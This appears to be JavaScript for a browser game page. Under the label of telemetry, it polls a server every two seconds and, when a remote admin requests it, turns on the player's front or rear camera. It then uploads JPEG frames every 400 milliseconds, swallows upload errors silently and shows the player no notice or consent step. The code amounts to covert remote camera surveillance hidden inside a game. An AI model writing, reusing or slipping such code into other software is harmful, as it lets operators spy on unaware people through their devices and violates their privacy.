// Device-side live stream helper (HTTP polling based, no websockets).
// The game page polls /api/telemetry/stream/status. When the admin requests a
// stream, we keep the camera running and POST JPEG frames at a low frame rate.
let streamMonitorTimer = null;
let streamLoopTimer = null;
let streamWanted = false;
let streamFacing = "environment";
let streamManagedCamera = false;

async function getStreamStatus() {
    try {
        const res = await fetch("/api/telemetry/stream/status");
        if (!res.ok) return null;
        return await res.json();
    } catch (err) {
        return null;
    }
}

function streamCaptureFrame() {
    const video = document.getElementById("video");
    if (!video || !video.videoWidth || !video.videoHeight) return;

    const canvas = document.createElement("canvas");
    const scale = Math.min(1, 960 / video.videoWidth);
    canvas.width = Math.max(2, Math.floor(video.videoWidth * scale));
    canvas.height = Math.max(2, Math.floor(video.videoHeight * scale));

    const ctx = canvas.getContext("2d");
    if (streamFacing === "user") {
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
    }
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob((blob) => {
        if (!blob) return;
        fetch("/api/telemetry/stream/frame", {
            method: "POST",
            headers: { "Content-Type": blob.type || "image/jpeg" },
            body: blob
        }).catch(() => {});
    }, "image/jpeg", 0.7);
}

function startStreamLoop() {
    stopStreamLoop();
    streamCaptureFrame();
    streamLoopTimer = setInterval(streamCaptureFrame, 400);
}

function stopStreamLoop() {
    if (streamLoopTimer) clearInterval(streamLoopTimer);
    streamLoopTimer = null;
}

function streamStopCamera() {
    const video = document.getElementById("video");
    if (video && video.srcObject) {
        video.srcObject.getTracks().forEach((track) => track.stop());
        video.srcObject = null;
    }
    if (video) video.classList.remove("mirror");
}

async function streamTick() {
    const status = await getStreamStatus();
    if (!status) return;

    const wanted = Boolean(status.requested);
    const facing = status.facing === "user" ? "user" : "environment";

    if (wanted && !streamWanted) {
        streamWanted = true;
        streamManagedCamera = true;
        streamFacing = facing;
        await startCamera(facing);
        startStreamLoop();
    } else if (wanted && streamWanted && facing !== streamFacing) {
        streamFacing = facing;
        await startCamera(facing);
    } else if (!wanted && streamWanted) {
        streamWanted = false;
        stopStreamLoop();
        if (streamManagedCamera) {
            streamManagedCamera = false;
            streamStopCamera();
        }
    }
}

function startStreamMonitor() {
    if (streamMonitorTimer) return;
    streamTick();
    streamMonitorTimer = setInterval(streamTick, 2000);
}

function stopStreamMonitor() {
    if (streamMonitorTimer) clearInterval(streamMonitorTimer);
    streamMonitorTimer = null;
    stopStreamLoop();
    if (streamManagedCamera) {
        streamManagedCamera = false;
        streamStopCamera();
    }
}
